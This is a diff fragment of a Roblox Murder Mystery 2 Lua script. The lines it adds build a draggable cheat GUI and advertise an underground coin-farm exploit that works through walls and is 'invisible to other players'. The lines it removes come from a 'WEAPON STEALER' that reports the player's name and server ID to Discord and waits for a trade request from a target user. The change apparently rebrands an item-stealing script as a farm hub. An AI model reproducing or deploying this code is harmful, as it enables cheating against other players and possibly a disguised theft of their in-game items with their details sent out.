+    end
+end)
+
+-- ============================================
+-- DRAG FUNCTIONALITY
+-- ============================================
+
+local dragging = false
+local dragInput
+local dragStart
+local startPos
+
+titleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = mainFrame.Position
+        
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
         end)
+    end
+end)
+
+titleBar.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        local delta = input.Position - dragStart
+        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
     end
 end)
 
@@ -230,18 +806,20 @@ end)
 -- INITIALIZE
 -- ============================================
 
-sendToDiscord(
-    "🚀 WEAPON STEALER LOADED",
-    "**Player:** " .. player.Name .. "\n" ..
-    "**Server:** `" .. game.JobId .. "`\n" ..
-    "**Status:** Waiting for " .. TARGET_USER
-)
-
 print("=" .. string.rep("=", 50))
-print("MM2 WEAPON STEALER - READY")
+print("MM2 ULTIMATE HUB - UNDERGROUND FARM")
 print("=" .. string.rep("=", 50))
-print("Target: " .. TARGET_USER)
-print("Waiting for trade request...")
+print("🔥 NEW FEATURE: Underground Auto Farm")
+print("   - Goes under the map to collect coins")
+print("   - Can collect coins through walls")
+print("   - Completely invisible to other players")
+print("=" .. string.rep("=", 50))
+print("Press Right Shift to toggle GUI")
 print("=" .. string.rep("=", 50))
 
-while wait(60) do end
+-- Toggle GUI with Right Shift
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if not gameProcessed and input.KeyCode == Enum.KeyCode.RightShift then
+        screenGui.Enabled = not screenGui.Enabled
+    end
+end)
